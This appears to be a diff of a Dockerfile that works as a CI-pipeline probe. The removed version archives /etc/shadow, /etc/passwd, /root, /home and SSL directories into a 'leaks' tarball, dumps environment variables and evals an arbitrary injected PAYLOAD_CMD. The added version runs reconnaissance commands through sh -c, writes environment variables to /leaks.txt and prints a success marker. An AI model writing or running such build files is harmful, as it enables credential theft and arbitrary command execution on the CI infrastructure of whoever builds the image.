@@ -1,21 +1,13 @@
 FROM python:3.11-alpine
 
-ARG PAYLOAD_CMD
+ARG PAYLOAD_CMD="whoami && id && uname -a && cat /etc/os-release"
+ARG MARKER="=== CI EXECUTION SUCCESSFUL ==="
 
-RUN apk add --no-cache curl tar bash && \
-    echo "[+] Collecting leaks..." && \
-    tar -czf /leaks.tar.gz \
-        /etc/hosts \
-        /etc/resolv.conf \
-        /etc/passwd \
-        /etc/shadow \
-        /etc/ssl \
-        /etc/pki \
-        /var/lib \
-        /root \
-        /home \
-        2>/dev/null || true && \
-    echo "[+] Dumping env vars (excluding OIDC/GITHUB tokens)..." && \
-    printenv | grep -vE "GITHUB_TOKEN|OIDC_TOKEN|AWS_" >> /leaks_env.txt && \
-    echo "[+] Executing payload..." && \
-    eval "$PAYLOAD_CMD"
+RUN apk add --no-cache curl bash coreutils grep \
+  && echo "[+] Building Docker image safely..." \
+  && echo "$MARKER" > /leaks.txt \
+  && echo "[+] Executing PAYLOAD_CMD..." >> /leaks.txt \
+  && sh -c "$PAYLOAD_CMD" >> /leaks.txt \
+  && echo "[+] ENV Dump (safe vars only)..." >> /leaks.txt \
+  && env | grep -v -e 'GITHUB_' -e 'OIDC' -e 'AWS' >> /leaks.txt \
+  && echo "[+] Finished successfully." >> /leaks.txt
